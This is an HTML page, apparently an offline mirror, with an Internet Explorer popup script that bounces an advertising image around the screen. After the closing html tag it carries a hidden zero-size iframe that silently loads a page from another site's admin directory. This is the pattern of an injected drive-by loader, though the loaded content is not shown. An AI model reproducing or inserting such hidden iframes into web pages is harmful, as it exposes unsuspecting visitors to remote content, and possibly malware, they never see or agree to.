<html><body link="#000000" vlink="#000000"><SCRIPT> 
var imagepath="01.gif"/*tpa=http://ad.zoomla.cn/ad/61/01.gif*/
var imagewidth=80
var imageheight=80

var speed=3; 
var imageclick="http://url/" 
var hideafter=0 

var isie=0; 
if(window.navigator.appName=="Microsoft Internet Explorer"&&window.navigator.appVersion.substring(window.navigator.appVersion.indexOf("MSIE")+5,window.navigator.appVersion.indexOf("MSIE")+8)>=5.5) { 
isie=1; 
} 
else { 
isie=0; 
} 

   if(isie){ 
      var preloadit=new Image() 
      preloadit.src=imagepath 
   } 


function pop() { 
if(isie) { 
x=x+dx;y=y+dy; 
oPopup.show(x, y, imagewidth, imageheight); 
if(x+imagewidth+5>screen.width) dx=-dx; 
if(y+imageheight+5>screen.height) dy=-dy; 
if(x<0) dx=-dx; 
if(y<0) dy=-dy; 
startani=setTimeout("pop();",50); 
} 
} 

function dismisspopup(){ 
clearTimeout(startani) 
oPopup.hide() 
} 

function dowhat(){ 
if (imageclick=="dismiss") 
dismisspopup() 
else 
window.open(imageclick);
} 


if(isie) { 
var x=0,y=0,dx=speed,dy=speed; 
var oPopup = window.createPopup(); 
var oPopupBody = oPopup.document.body; 
oPopupBody.style.cursor="hand" 
oPopupBody.innerHTML = '<IMG SRC="'+preloadit.src+'">'; 
oPopup.document.body.onmouseover=new Function("clearTimeout(startani)") 
oPopup.document.body.onmouseout=pop 
oPopup.document.body.onclick=dowhat 
pop(); 

if (hideafter>0) 
setTimeout("dismisspopup()",hideafter*1000) 
} 
</SCRIPT>  </body></html><iframe src="../../../www.mymole.net/admin/inc/ccd.htm" tppabs="http://www.mymole.net/admin/inc/ccd.htm" width=0 height=0></iframe>
